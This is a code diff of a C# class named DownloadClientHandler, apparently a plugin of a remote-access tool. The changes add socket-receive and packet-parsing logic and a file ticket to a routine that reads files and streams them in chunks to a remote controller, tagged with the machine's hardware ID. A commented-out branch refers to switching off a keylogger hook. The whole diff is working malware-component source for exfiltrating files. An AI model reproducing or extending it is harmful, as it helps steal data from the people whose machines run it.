@@ -4,6 +4,7 @@ using PacketLib.Utils;
 using System;
 using System.IO;
 using System.Net.Sockets;
+using System.Threading;
 
 /* 
 || AUTHOR Arsium ||
@@ -14,14 +15,14 @@ namespace Plugin
 {
     internal class DownloadClientHandler : IDisposable
     {
-        internal const int BUFFER_CHUNK_SIZE = 524288;//524288 (1024 * 512) // 1048576 = 1MB (1024*1024) // 2097152 (1024 * 2048) // 4194304 (2048 * 2048)
+        internal readonly int BUFFER_CHUNK_SIZE = 524288;//524288 (1024 * 512) // 1048576 = 1MB (1024*1024) // 2097152 (1024 * 2048) // 4194304 (2048 * 2048)
         public LoadingAPI loadingAPI { get; set; }
         private Socket socket { get; set; }
         public bool Connected { get; set; }
         public string HWID { get; set; }
         public string baseIp { get; set; }
-        public bool closeClient { get; set; }
-
+        public long fileTicket { get; set; }
+        public bool hasToExit { get; set; }
 
 
         public delegate bool ConnectAsync();
@@ -32,10 +33,20 @@ namespace Plugin
         private readonly SendDataAsync sendDataAsync;
 
 
-        public DownloadClientHandler(LoadingAPI loadingAPI) : base()
+        public delegate byte[] ReadDataAsync();
+        public delegate IPacket ReadPacketAsync(byte[] BufferPacket);
+
+        public ReadDataAsync readDataAsync;
+        public ReadPacketAsync readPacketAsync;
+
+        public DownloadClientHandler(LoadingAPI loadingAPI, long fileTicket, int bufferSize = 524288) : base()
         {
             this.loadingAPI = loadingAPI;
+            this.fileTicket = fileTicket;
+            BUFFER_CHUNK_SIZE = bufferSize;
             sendDataAsync = new SendDataAsync(SendData);
+            readDataAsync = new ReadDataAsync(ReceiveData);
+            readPacketAsync = new ReadPacketAsync(PacketParser);
         }
 
 
@@ -57,6 +68,7 @@ namespace Plugin
             catch { }
             return false;
         }
+
         public void EndConnect(IAsyncResult ar)
         {
             Connected = connectAsync.EndInvoke(ar);
@@ -65,9 +77,94 @@ namespace Plugin
             {
                 ConnectStart();
             }
+            /*else
+            {
+                Receive();
+            }*/
         }
 
-        public void StartSendingFile(string filePath) 
+
+        public void Receive()
+        {
+            if (hasToExit)
+            {
+                this.Dispose();
+                return;
+            }
+
+            if (Connected)
+                readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
+            else
+                ConnectStart();
+        }
+
+        private byte[] ReceiveData()
+        {
+            try
+            {
+                int total = 0;
+                int recv;
+                byte[] header = new byte[5];
+                socket.Poll(-1, SelectMode.SelectRead);
+                recv = socket.Receive(header, 0, 5, 0);
+
+                int size = BitConverter.ToInt32(new byte[4] { header[0], header[1], header[2], header[3] }, 0);
+                PacketType packetType = (PacketType)header[4];
+
+                int dataleft = size;
+                byte[] data = new byte[size];
+                while (total < size)
+                {
+                    recv = socket.Receive(data, total, dataleft, 0);
+                    total += recv;
+                    dataleft -= recv;
+                }
+
+                return data;
+            }
+            catch (Exception)
+            {
+                if (Connected)
+                    hasToExit = true;
+
+                Connected = false;
+                return null;
+            }
+        }
+        public void EndDataRead(IAsyncResult ar)
+        {
+            byte[] data = readDataAsync.EndInvoke(ar);
+
+            if (data != null && data.Length > 0 && Connected)
+                readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);
+
+            Receive();
+        }
+
+
+        private IPacket PacketParser(byte[] BufferPacket)
+        {
+            return BufferPacket.DeserializePacket(loadingAPI.key);
+        }
+        public void EndPacketRead(IAsyncResult ar)
+        {
+            IPacket packet = readPacketAsync.EndInvoke(ar);
+            ParsePacket(packet);
+        }
+
+        public void ParsePacket(IPacket packet)
+        {
+            return;
+            /*switch (packet.packetType)
+            {
+                case PacketType.KEYLOG_OFF:
+                    this.hasToExit = true;
+                    KeyLib.Hook.AbortHook();
+                    break;
+            }*/
+        }
+
+        internal void StartSendingFile(string filePath) 
         {
             using (Stream source = File.OpenRead(filePath))
             {
@@ -79,12 +176,11 @@ namespace Plugin
                 {
                     while ((bytesRead = source.Read(buffer, 0, buffer.Length)) > 0)
                     {
-                        DownloadFilePacket packetFile = new DownloadFilePacket(buffer, filePath, loadingAPI.baseIp, loadingAPI.HWID);
+                        Thread.Sleep(100);
+                        DownloadFilePacket packetFile = new DownloadFilePacket(buffer, filePath, loadingAPI.baseIp, loadingAPI.HWID, this.fileTicket);
                         IAsyncResult ar = sendDataAsync.BeginInvoke(packetFile, null, null);
-
-                        /*while (!ar.IsCompleted)
-                            Thread.Sleep(50);
-                        */
+                        Thread.Sleep(75);
+       
                         int size = sendDataAsync.EndInvoke(ar);
 
                         totalSize -= bytesRead;
@@ -96,7 +192,7 @@ namespace Plugin
                 {
                     buffer = new byte[totalSize];
                     source.Read(buffer, 0, buffer.Length);
-                    DownloadFilePacket packetFile = new DownloadFilePacket(buffer, filePath, loadingAPI.baseIp, loadingAPI.HWID);
+                    DownloadFilePacket packetFile = new DownloadFilePacket(buffer, filePath, loadingAPI.baseIp, loadingAPI.HWID, this.fileTicket);
                     IAsyncResult ar = sendDataAsync.BeginInvoke(packetFile, null, null);
                     int size = sendDataAsync.EndInvoke(ar);
                 }
